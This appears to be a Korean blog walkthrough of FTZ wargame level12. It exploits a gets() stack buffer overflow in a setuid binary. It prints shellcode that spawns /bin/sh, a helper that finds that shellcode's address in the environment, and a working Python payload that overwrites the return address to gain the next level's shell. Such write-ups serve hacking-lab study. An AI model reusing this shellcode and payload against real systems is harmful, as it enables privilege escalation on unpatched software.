# FTZ Level12

#### ID : level12 PW: it is like this
<br>

**먼저 ```ls -l```을 이용해 어떤 파일이 있는지 살펴보자**<br> 

attackme 프로그램에 level13의 권한으로 setuid가 걸려있는 것을 확인할 수 있다.<br><br>
우선 hint의 내용을 보자<br>
```cat hint```<br>
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
      char str[256];                  # 256바이트 크기의 문자형 배열
      
      setreuid(3093, 3093);           #level13의 프로세스 ID
      printf("문장을 입력하세요.\n");
      gets(str);                      #gets 함수로 배열 str에 입력을 받음
      printf("%s\n", str);            #입력받은 내용 출력
}
```
```gets``` 함수에서 BOF가 일어날 수 있다!!<br><br>
우리의 목적을 생각해보자.<br>
버퍼에 버퍼크기보다 넘치는 양을 담아 오버플로우를 일으킨 후 ret까지 도달해 ret에 쉘 코드 주소를 넣을 것이다. 
그렇다면..!!!<br>
1. str[256]에서 ret까지의 거리 구하기
2. 환경변수로 쉘 코드 등록하고 위치 찾는 코드를 짜 주소 확인하기
3. ret 위치까지 갈 페이로드 작성하기
4. 작성한 페이로드로 공격해 쉘 획득하기!!

**attackme 코드를 디버깅해야하기 때문에 tmp폴더로 복사하자.**<br>
```cp attackme tmp```<br><br>

**그리고 디버깅을 해보자**<br>
```gdb -q attackme```<br>
```disas main```<br>

<main+3>을 보면 esp에서 0x108만큼 빼고 있다. 여기서 0x108은 10진수로 264이다.<br>
필요한 공간은 str배열의 크기인 256일텐데 왜 264나 자리를 마련했을까?<br>
바로 dummy다! 8byte의 dummy가 존재하는 것이다. ~~(왜 존재할까)~~<br><br>

ret전에 sfp 4바이트가 존재할테니 결론적으로 말하면<br>
**str에서 ret까지의 거리는 총 268byte이다!**<br><br>

자, 2번으로 넘어가자.<br>
**다음과 같이 환경변수를 작성해보자.**쉘 코드는 구글에서 돌아다니는 25byte짜리를 가져왔다. <br>
*(다음에 쉘 코드에 대해 더 공부해봐야겠다....)*<br>
```
export shellcode=$(python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
```

**이제 쉘 코드의 주소를 알아보자**<br>
```vi shell.c``` vi로 쉘 주소 알아내는 코드를 작성해보자<br>
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[1]){
      printf("%p\n", getenv("shellcode"));
      return 0;
}
```
그리고 만든 c코드를 컴파일 한 후 <br>
```gcc -o shell shell.c```<br>
실행시킨다!<br>
```./shell```<br>
그럼 주소가 떨어진다<br>
필자의 경우 **0xbffffef4**였다.<br>

**이제 페이로드를 작성해보자.**<br>
페이로드는 ```(python -c 'print "A"*268+"\xf4\xfe\xff\xbf";cat)|./attackme```가 될 것이다.<br>
*(주소는 little endian 방식으로 입력된다)*<br>
<br>
```cd ..``` 다시 원래 디렉토리로 되돌아가서<br>
**공격 실시!**<br>
```(python -c 'print "A"*268+"\xf4\xfe\xff\xbf";cat)|./attackme```<br>
```my-pass```로 비밀번호를 물어보면<br>
Level13 Password is "~~". 라고 나올 것이다!!
